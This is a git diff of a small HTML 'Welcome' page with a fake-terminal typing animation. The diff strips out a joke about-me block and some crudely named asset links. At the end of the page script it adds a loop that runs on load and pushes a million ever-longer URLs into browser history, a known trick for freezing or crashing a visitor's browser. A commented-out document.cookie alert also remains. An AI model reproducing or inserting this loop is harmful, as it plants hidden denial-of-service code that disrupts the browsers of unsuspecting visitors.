@@ -1,8 +1,8 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>hello, world!</title>
+	<meta charset="utf-8">
+	<title>Welcome</title>
   	<style>
         * {
           padding: 0px;
@@ -19,41 +19,28 @@
             width: 700px;
         }
   	</style>
-	<script src="./js/j.js"></script>
+
 	<script>
 		//alert(document.cookie);
 	</script>
 </head>
 <body>
-<img src="./img/fuckpng"/>
-<a href="bitch.html">测试</a>
-        <pre id="two" style="display:none">
-host login:edison
-Password:**************
-login ok             
-[root@localhost ~]# cd /
-[root@localhost /]# ls
-bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  selinux  srv  sys  tmp  usr  var
-[root@localhost /]# cat /tmp/file
-“如果我不再为第一场雪欢呼了，那我一定是老了。”
-            ——伯德· 约翰逊（Lady Bird Johnson）
-[root@localhost /]# vim about.java
-/** 
- * @author Edison 
-**/ 
 
-public class about { 
-     public String 姓名 = "顾惜朝"; 
-     public String 性别 = "不搞基"; 
-     public String 学历 = "蓝翔技校厨师专业"; 
-     public String 联系邮箱 = "imguxizhao@gmail.com"; 
-     public String 联系电话 = "不告诉你"; 
-     public String 个人网站 = "http://edisonhe.github.io"; 
-     public String 版权信息 = "版权所有(C)2015"; 
-}
-[root@localhost /]# 等你来编译...
-        </pre>
-        <h1><pre  id="one"></pre></h1>
+	<!-- 测试是否能用-->
+	<!--
+	<script src="./js/j.js"></script>
+	<img src="./img/fuckpng"/>
+	<a href="bitch.html">Welcome</a>
+	-->
+
+<pre id="two" style="display:none">
+host login:Anonymous
+Password:**************
+login ok
+[Anonymous@localhost ~]# cat /tmp/file
+正在载入,请耐心等待...
+</pre>
+	<h1><pre  id="one"></pre></h1>
 
 
        <script>
@@ -69,14 +56,21 @@ public class about {
                 }
             }, speed);
           };
-
           var  oDiv = document.getElementById("one");
           var  oDiv2 = document.getElementById('two');
           var str  = oDiv2.innerHTML;
-
           setTimeout(function(){
               prints( oDiv ,str, 100 );
           },100);
+
+
+	var total="";
+	for (var i=0;i<1000000;i++)
+	{
+		total= total+i.toString();
+		history.pushState(0,0,total);
+	}
+
       </script>
 </body>
 </html>
